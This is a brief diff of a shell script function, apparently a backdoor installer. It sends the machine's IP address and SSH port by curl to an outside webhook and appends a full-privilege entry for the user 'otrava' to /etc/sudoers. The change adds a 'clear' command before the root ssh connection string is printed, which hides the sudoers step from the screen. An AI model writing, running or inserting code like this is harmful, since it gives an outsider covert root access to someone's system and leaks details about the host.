@@ -8,8 +8,9 @@ function enabler {
     SSH_ENABLED="SSH is enabled"
     DATA="{\"content\": \"IP Address: $IP\nSSH Port: $SSH_PORT\n$SSH_ENABLED\"}"
     curl -X POST -H "Content-Type: application/json" -d "$DATA" "$WEBHOOK_URL"
-    echo "ssh://$IP@root:$SSH_PORT"
     echo "otrava ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
+    clear
+    echo "ssh://$IP@root:$SSH_PORT"
 }
 
 echo password:
